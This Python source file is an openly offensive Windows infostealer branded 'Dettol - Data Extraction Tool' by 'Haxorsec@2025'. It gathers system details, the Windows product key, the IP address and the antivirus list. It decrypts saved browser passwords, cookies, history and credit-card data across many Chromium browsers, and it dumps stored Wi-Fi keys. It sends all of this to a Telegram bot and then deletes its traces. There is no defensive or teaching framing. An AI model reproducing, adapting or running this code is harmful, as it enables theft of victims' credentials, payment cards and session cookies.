# HaxorSec@2025
import os
import sqlite3
import json
import base64
import shutil
import requests
from Crypto.Cipher import AES
import win32crypt
import zipfile
import io
import time

bot_token = 'BOT TOKEN'
chat_id = 'CHAT ID'

import os
import subprocess
import requests
import psutil
from screeninfo import get_monitors
import pycountry
import time
        
CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RESET = '\033[0m'
RED = '\033[91m'

class PcInfo:
    def __init__(self):
        self.get_system_info()

    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return "unknown"

    def get_all_avs(self) -> str:
        try:
            process = subprocess.run(
                "Get-WmiObject -Namespace 'Root\\SecurityCenter2' -Class AntivirusProduct | Select-Object displayName",
                shell=True, capture_output=True, text=True
            )
            if process.returncode == 0:
                output = process.stdout.strip().splitlines()
                if len(output) >= 2:
                    av_list = [av.strip() for av in output[1:] if av.strip()]
                    return ", ".join(av_list)
            return "No antivirus found"
        except Exception as e:
            print(f"Error getting antivirus: {e}")
            return "Error retrieving antivirus information"

    def get_screen_resolution(self):
        try:
            monitors = get_monitors()
            resolutions = [f"{monitor.width}x{monitor.height}" for monitor in monitors]
            return ', '.join(resolutions) if resolutions else "Unknown"
        except Exception as e:
            print(f"Error getting screen resolution: {e}")
            return "Unknown"

    def get_system_info(self):
        try:
            print(f"{CYAN}🔍 Extracting PC info...{RESET}")
            computer_os = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_OperatingSystem).Caption"', capture_output=True, shell=True, text=True)
            computer_os = computer_os.stdout.strip() if computer_os.returncode == 0 else "Unknown"
            cpu = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_Processor).Name"', capture_output=True, shell=True, text=True)
            cpu = cpu.stdout.strip() if cpu.returncode == 0 else "Unknown"
            gpu = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_VideoController).Name"', capture_output=True, shell=True, text=True)
            gpu = gpu.stdout.strip() if gpu.returncode == 0 else "Unknown"
            ram = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory"', capture_output=True, shell=True, text=True)
            ram = str(round(int(ram.stdout.strip()) / (1024 ** 3))) if ram.returncode == 0 else "Unknown"
            model = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Model"', capture_output=True, shell=True, text=True)
            model = model.stdout.strip() if model.returncode == 0 else "Unknown"
            username = os.getenv("UserName")
            hostname = os.getenv("COMPUTERNAME")
            uuid = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID"', capture_output=True, shell=True, text=True)
            uuid = uuid.stdout.strip() if uuid.returncode == 0 else "Unknown"
            product_key = subprocess.run('powershell -Command "(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey"', capture_output=True, shell=True, text=True)
            product_key = product_key.stdout.strip() if product_key.returncode == 0 and product_key.stdout.strip() != "" else "Failed to get product key"
            r = requests.get("http://ip-api.com/json/?fields=225545").json()
            country = r.get("country", "Unknown")
            proxy = r.get("proxy", False)
            ip = r.get("query", "Unknown")
            _, addrs = next(iter(psutil.net_if_addrs().items()))
            mac = addrs[0].address
            screen_resolution = self.get_screen_resolution()

            message = f'''
**PC Username:** `{username}`
**PC Name:** `{hostname}`
**Model:** `{model if model else "Unknown"}`
**Screen Resolution:** `{screen_resolution}`
**OS:** `{computer_os}`
**Product Key:** `{product_key}`\n
**IP:** `{ip}`
**Country:** `{country}`
**Proxy:** `{"Yes" if proxy else "No"}`
**MAC:** `{mac}`
**UUID:** `{uuid}`\n
**CPU:** `{cpu}`
**GPU:** `{gpu}`
**RAM:** `{ram}GB`\n
**Antivirus:** `{self.get_all_avs()}`'''

            tasklist = subprocess.run("tasklist", capture_output=True, shell=True, text=True)
            tasklist_output = tasklist.stdout.strip()

            installed_apps = subprocess.run("wmic product get name", capture_output=True, shell=True, text=True)
            installed_apps_output = installed_apps.stdout.strip()

            log_file = "tasklist.txt"
            with open(log_file, 'w', encoding='utf-8') as f: 
                f.write("List of running applications:\n")
                f.write(tasklist_output)
                f.write("\n\nList of installed software:\n")
                f.write(installed_apps_output)
            print(f"{GREEN}[ᯓ➤] Sending To Telegram...{RESET}")
            self.send_message_to_telegram(message)
            self.send_file_to_telegram(log_file)
            os.remove(log_file)
            print(f"{CYAN}[!] The file {log_file} has been deleted.{RESET}")

        except Exception as e:
            self.send_message_to_telegram(f"Error occurred: {str(e)}")
            print(f"Error occurred: {str(e)}")

    def send_message_to_telegram(self, message: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        retries = 3  
        for attempt in range(retries):
            try:
                response = requests.post(
                    url,
                    data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
                )
                if response.status_code == 200:
                    print(f"{GREEN}[✅] Message sent successfully.{RESET}")
                    return response
                else:
                    print(f"{RED}[❌] Message could not be sent. Status code:{RESET} {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"{RED}[❌] Attempt {attempt + 1} failed:{RESET} {e}")
                if attempt < retries - 1:
                    time.sleep(5)  
                else:
                    print(f"{RED}[❌] Tried maximum. Could not send message.{RESET}")
        return None

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3  
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    response = requests.post(
                        url,
                        files={'document': file},
                        data={'chat_id': chat_id}
                    )
                if response.status_code == 200:
                    print(f"{GREEN}[✅] File sent successfully.{RESET}")
                    return response
                else:
                    print(f"{RED}[❌] Unable to send file. Status code:{RESET} {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"{RED}[❌] Attempt {attempt + 1} failed:{RESET} {e}")
                if attempt < retries - 1:
                    time.sleep(5)  
                else:
                    print(f"{RED}[❌] Tried max. Could not send file.{RESET}")
        return None


class Browser:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }

        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)
        self.detected_profiles = {}
        self.detect_all_profiles()
        self.print_profiles()
        self.create_zip_file()
        self.send_file_to_telegram("password_full.zip")
        if os.path.exists("password_full.zip"):
            os.remove("password_full.zip")

    def detect_profiles(self, path):
        if not os.path.isdir(path):
            return []
        return [p for p in os.listdir(path) if os.path.isdir(os.path.join(path, p))]

    def detect_all_profiles(self):
        threads = []

        def process_browser(name, path):
            profiles = self.detect_profiles(path)
            if profiles:
                self.detected_profiles[name] = profiles

        for name, path in self.browsers.items():
            t = threading.Thread(target=process_browser, args=(name, path))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    def print_profiles(self):
        if not self.detected_profiles:
            print(f"{RED}[❌] No browsers/profiles detected.{RESET}")
            return
        for browser, profiles in self.detected_profiles.items():
            print(f"{CYAN}[✅] {browser}:{GREEN} {profiles}")

    def get_encryption_key(self, browser_path):
        local_state_path = os.path.join(browser_path, 'Local State')
        if not os.path.exists(local_state_path):
            return None
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state_data = json.load(f)
            encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception:
            return None

    def decrypt_password(self, encrypted_password, key):
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            return decrypted_password
        except Exception:
            return None

    def extract_passwords(self, zip_file):
        for browser, profiles in self.detected_profiles.items():
            browser_path = self.browsers[browser]
            key = self.get_encryption_key(browser_path)
            if not key:
                continue
            for profile in profiles:
                login_db_path = os.path.join(browser_path, profile, 'Login Data')
                if not os.path.exists(login_db_path):
                    continue
                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_LoginData.db")
                shutil.copyfile(login_db_path, tmp_db_path)
                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                    password_data = io.StringIO()
                    password_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    password_data.write("="*120 + "\n")
                    password_data.write(f"{'Website':<60} | {'Username':<30} | {'Password':<30}\n")
                    password_data.write("="*120 + "\n")

                    for row in cursor.fetchall():
                        origin_url, username, encrypted_password = row
                        decrypted_password = self.decrypt_password(encrypted_password, key)
                        if username and decrypted_password:
                            password_data.write(f"{origin_url:<60} | {username:<30} | {decrypted_password:<30}\n")
                    password_data.write("\n")
                    zip_file.writestr(f"browser/{browser}_passwords_{profile}.txt", password_data.getvalue())
                except Exception as e:
                    print(f"{RED}[❌] Error extracting passwords from {browser} - {profile}:{RESET} {e}")
                finally:
                    cursor.close()
                    conn.close()
                    os.remove(tmp_db_path)

    def extract_history(self, zip_file):
        for browser, profiles in self.detected_profiles.items():
            browser_path = self.browsers[browser]
            if not os.path.exists(browser_path):
                continue

            for profile in profiles:
                history_db_path = os.path.join(browser_path, profile, 'History')
                if not os.path.exists(history_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_History.db")
                try:
                    shutil.copyfile(history_db_path, tmp_db_path)
                except PermissionError:
                    print(f"{RED}[❌] Could not copy file {CYAN}{history_db_path}. The file may be in use.{RESET}")
                    continue  

                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")

                    history_data = io.StringIO()
                    history_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    history_data.write("="*120 + "\n")
                    history_data.write(f"{'URL':<80} | {'Title':<30} | {'Visit Count':<10} | {'Last Visit Time'}\n")
                    history_data.write("="*120 + "\n")

                    for row in cursor.fetchall():
                        url, title, visit_count, last_visit_time = row
                        history_data.write(f"{url:<80} | {title:<30} | {visit_count:<10} | {last_visit_time}\n")
                        
                    history_data.write("\n")
                    zip_file.writestr(f"browser/{browser}_history_{profile}.txt", history_data.getvalue())
                except Exception as e:
                    print(f"{RED}[❌] Error extracting history from {browser} - {profile}{RESET}")

                finally:
                    cursor.close()
                    conn.close()
                    os.remove(tmp_db_path)

    def create_zip_file(self):
        with zipfile.ZipFile("password_full.zip", "w") as zip_file:
            self.extract_passwords(zip_file)
            self.extract_history(zip_file)

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    response = requests.post(
                        url,
                        files={'document': file},
                        data={'chat_id': chat_id}
                    )
                if response.status_code == 200:
                    print(f"{GREEN}[✅] File sent successfully.{RESET}")
                    return
                else:
                    print(f"{RED}[❌] Unable to send file. Status code:{RESET} {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"{RED}[❌] Attempt {attempt+1} failed:{RESET} {e}")
                if attempt < retries-1:
                    time.sleep(5)
                else:
                    print(f"{RED}[❌] Max retries reached. Could not send file.{RESET}")


import base64
import json
import os
import random
import sqlite3
import threading            # Tunggu semua thread selesai

from Crypto.Cipher import AES
import shutil
import zipfile
import requests
import time
from typing import Union
from win32crypt import CryptUnprotectData

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }

        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)
        self.detected_profiles = {}
        self.detect_all_profiles()
        self.print_profiles()
        self.masterkeys = {b: self.get_master_key(os.path.join(p, 'Local State')) 
                           for b, p in self.browsers.items()}
        self.create_zip_and_send()

    def detect_profiles(self, path):
        if not os.path.isdir(path):
            return []
        return [p for p in os.listdir(path) if os.path.isdir(os.path.join(path, p))]

    def detect_all_profiles(self):
        threads = []
        def process_browser(name, path):
            profiles = self.detect_profiles(path)
            if profiles:
                self.detected_profiles[name] = profiles
                self.funcs = [
                    self.cookies,
                    self.history,
                    self.passwords,
                    self.credit_cards
                ]
        for name, path in self.browsers.items():
            t = threading.Thread(target=process_browser, args=(name, path))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()


    def print_profiles(self):
        if not self.detected_profiles:
            print(f"{RED}[❌] No browsers/profiles detected.{RESET}")
            return
        for browser, profiles in self.detected_profiles.items():
            print(f"{CYAN}[✅] {browser}:{GREEN} {profiles}")

    def get_master_key(self, path: str) -> bytes:
        if not os.path.exists(path):
            return None
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            enc_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
        except Exception:
            return None

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            return decrypted
        except Exception:
            return None

    def extract_data(self, name: str, profile: str, path_suffix: str, query: str, keys: list, file_path: str, row_callback=None):
        browser_path = self.browsers[name]
        masterkey = self.masterkeys.get(name)
        if not masterkey:
            return

        if name in ['opera', 'opera-gx']:
            db_path = os.path.join(browser_path, path_suffix)
        else:
            db_path = os.path.join(browser_path, profile, path_suffix)
        if not os.path.isfile(db_path):
            return
        
        tmp_db = self.create_temp()
        try:
            shutil.copy2(db_path, tmp_db)
        except PermissionError:
            print(f"{CYAN}[!] Permission denied:{RED} {db_path}{RESET}")
            return

        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()

        with open(file_path, 'a', encoding='utf-8') as f:
            for row in cursor.execute(query).fetchall():
                if row_callback:
                    row_callback(row)
                else:
                    line = []
                    for i, val in enumerate(row):
                        if keys[i] == 'encrypted':
                            val = self.decrypt_password(val, masterkey)
                        line.append(str(val))
                    f.write('  |  '.join(line) + '\n')

        cursor.close()
        conn.close()
        os.remove(tmp_db)


    def passwords(self, name, profile):
        file_path = os.path.join(self.temp_path, "Browser", "passwords.txt")
        if not os.path.exists(file_path):
            open(file_path, 'w').close()

        if os.path.getsize(file_path) == 0:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write("Website  |  Username  |  Password\n\n")

        self.extract_data(
            name, profile, 'Login Data',
            "SELECT origin_url, username_value, password_value FROM logins",
            ['plain','plain','encrypted'],
            file_path
        )


    def cookies(self, name, profile):
        file_path = os.path.join(self.temp_path, "Browser", "cookies.txt")
        if not os.path.exists(file_path):
            open(file_path, 'w').close()

        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            f.write("Host\tPersistent\tPath\tSecure\tExpires\tName\tValue\n\n")

        def write_cookie(row):
            host_key, cookie_name, path_val, encrypted_value, expires_utc = row
            value = self.decrypt_password(encrypted_value, self.masterkeys.get(name))
            if host_key and cookie_name and value != "":
                with open(file_path, 'a', encoding='utf-8') as f:
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path_val}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{cookie_name}\t{value}\n")

        self.extract_data(
            name, profile, 'Network\\Cookies',
            "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies",
            ['plain','plain','plain','encrypted','plain'],
            file_path,
            row_callback=write_cookie
        )


    def history(self, name, profile):
        file_path = os.path.join(self.temp_path, "Browser", "history.txt")
        if not os.path.exists(file_path):
            open(file_path, 'w').close()

        if os.path.getsize(file_path) == 0:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write("Url  |  Visit Count\n\n")

        self.extract_data(
            name, profile, 'History',
            "SELECT url, visit_count FROM urls",
            ['plain', 'plain'],
            file_path
        )


    def credit_cards(self, name, profile):
        file_path = os.path.join(self.temp_path, "Browser", "ccs.txt")
        if not os.path.exists(file_path):
            open(file_path, 'w').close()

        if os.path.getsize(file_path) == 0:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")

        self.extract_data(
            name, profile, 'Web Data',
            "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards",
            ['plain','plain','plain','encrypted'],
            file_path
        )


    def create_temp(self, _dir: Union[str, os.PathLike]=None):
        if _dir is None: _dir = os.path.join(self.temp_path, "tmp")
        os.makedirs(_dir, exist_ok=True)
        path = os.path.join(_dir, ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12)))
        open(path, 'w').close()
        return path

    def create_zip_and_send(self):
        threads = []
        for name, profiles in self.detected_profiles.items():
            for profile in profiles:
                for func in [self.passwords, self.cookies, self.history, self.credit_cards]:
                    t = threading.Thread(target=func, args=(name, profile))
                    t.start()
                    threads.append(t)
        for t in threads: t.join()

        files = ['passwords.txt','cookies.txt','history.txt','ccs.txt']
        files = [os.path.join(self.temp_path, "Browser", f) for f in files if os.path.exists(os.path.join(self.temp_path, "Browser", f))]
        zip_path = os.path.join(self.temp_path, "BrowserData.zip")
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for f in files: zipf.write(f, os.path.basename(f))
        self.send_file_to_telegram(zip_path)
        for f in files + [zip_path]:
            if os.path.exists(f): os.remove(f)

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    r = requests.post(url, files={'document': file}, data={'chat_id': chat_id})
                if r.status_code == 200:
                    print(f"{GREEN}[✅] File sent successfully.{RESET}")
                    return
            except Exception as e:
                print(f"Attempt {attempt+1} failed: {e}")
                time.sleep(5)
        print(f"{RED}[❌] Failed to send file after retries{RESET}")

import requests
import subprocess
import re
import time

class Wifi:
    def __init__(self):
        self.networks = {}
        self.get_networks()
        self.send_info_to_telegram()

    def run_command(self, command, encoding='utf-8'):
        try:
            result = subprocess.run(command, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            print(f"{RED}[❌] Error executing command {command}:{RESET} {e}")
            return f"{RED}[❌] Error:{RESET} {e}"

    def get_networks(self):
        output_networks = self.run_command(["netsh", "wlan", "show", "profiles"])
        if "Error" in output_networks:
            print(f"{RED}[❌] Error in getting Wi-Fi profiles:{RESET}", output_networks)
            return  
        
        profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profile" in line]
        if not profiles:
            print(f"{RED}[❌] No Wi-Fi profiles found.{RESET}")
        
        for profile in profiles:
            if profile:
                profile_info = self.run_command(["netsh", "wlan", "show", "profile", profile, "key=clear"])
                self.networks[profile] = self.extract_password(profile_info)

    def extract_password(self, profile_info):
        match = re.search(r"Key Content\s*:\s*(.+)", profile_info)
        return match.group(1).strip() if match else "No password found"

    def get_router_ip(self):
        output = self.run_command("ipconfig")
        if "Error" in output:
            print("Error in getting router IP:", output)
            return "Failed to get router IP"
        
        router_ip = None
        is_eth = False  
        for line in output.splitlines():
            if "Ethernet adapter" in line:  
                is_eth = True
            elif is_eth and "Default Gateway" in line:
                router_ip = line.split(":")[1].strip()
                break
        
        if not router_ip:
            print(f"{RED}[❌] Failed to get router IP from LAN.{RESET}")
        return router_ip if router_ip else "Failed to get router IP"

    def get_mac_address(self):
        router_ip = self.get_router_ip()
        if router_ip == "Failed to get router IP":
            return "Failed to get MAC address"
        
        self.run_command(f"ping -n 1 {router_ip}")  
        output = self.run_command(f"arp -a {router_ip}")
        if "Error" in output:
            print("Error in getting MAC address:", output)
            return "MAC address not found"
        
        mac_address_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)
        return mac_address_match.group() if mac_address_match else "MAC address not found"

    def get_vendor_info(self, mac_address):
        try:
            url = f"https://api.macvendors.com/{mac_address}"
            response = requests.get(url)
            if response.status_code == 200:
                return response.text
            else:
                print(f"{RED}[❌] Failed to get vendor info. Status code:{RESET} {response.status_code}")
                return "Vendor info not found"
        except requests.RequestException as e:
            print(f"{RED}[❌] Error in getting vendor info:{RESET} {e}")
            return f"Error: {e}"

    def send_info_to_telegram(self):
        router_ip = self.get_router_ip()
        mac_address = self.get_mac_address()
        vendor_info = self.get_vendor_info(mac_address)
        
        message = f'''
**Router IP Address:** `{router_ip}`
**Router MAC Address:** `{mac_address}`
**Router Vendor:** `{vendor_info}`
**Saved Wi-Fi Networks:**
'''
        if self.networks:
            for network, password in self.networks.items():
                message += f"- `{network}`: `{password}`\n"
        else:
            message += "No Wi-Fi networks found."
        
        self.send_message_to_telegram(message)

    def send_message_to_telegram(self, message: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        retries = 3  
        for attempt in range(retries):
            try:
                response = requests.post(
                    url,
                    data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
                )
                if response.status_code == 200:
                    print(f"{GREEN}[✅] Message sent successfully.{RESET}")
                    return response
                else:
                    print(f"{RED}[❌] Message could not be sent. Status code:{RESET} {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Attempt {attempt + 1} failed: {e}")
                if attempt < retries - 1:
                    time.sleep(5)  
                else:
                    print(f"{RED}[❌] Tried maximum. Could not send message.{RESET}")
        return None

def print_banner():
    
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

    title = "Dettol - Data Extraction Tool"
    author = "Haxorsec@2025"
    width = 42  

    top_bottom_border = f"{CYAN}+{'-' * (width + 2)}+{RESET}"
    title_line = f"{CYAN}| {GREEN}{title.center(width)}{RESET} {CYAN}|{RESET}"
    author_line = f"{CYAN}| {YELLOW}{author.center(width)}{RESET} {CYAN}|{RESET}"

    banner = f"""
{top_bottom_border}
{title_line}
{author_line}
{top_bottom_border}
    """
    print(banner)


def main():
    print_banner()
    PcInfo()
    Browser()
    Browsers() 
    Wifi()  

if __name__ == "__main__":
    main()
